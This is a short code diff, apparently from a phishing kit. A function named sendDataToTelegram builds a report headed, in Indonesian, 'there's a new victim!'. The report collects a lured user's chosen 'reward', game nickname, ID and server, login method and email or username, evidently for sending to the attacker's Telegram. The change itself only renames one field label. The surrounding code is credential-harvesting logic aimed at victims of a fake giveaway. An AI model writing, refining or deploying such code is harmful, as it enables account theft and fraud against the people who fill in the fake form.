@@ -562,7 +562,7 @@ function sendDataToTelegram() {
 
     const message = "ADA KORBAN BARU NIH!\n\n" +
                     "Hadiah: " + chosenReward + "\n" +
-                    "Nickname/ID: " + verifiedNickname + "\n" +
+                    "Nickname: " + verifiedNickname + "\n" +
                     "ID & Server: " + uid + " (" + sid + ")\n" +
                     "Akun: " + method + "\n" +
                     "Email/User: " + userAcc + "\n" +
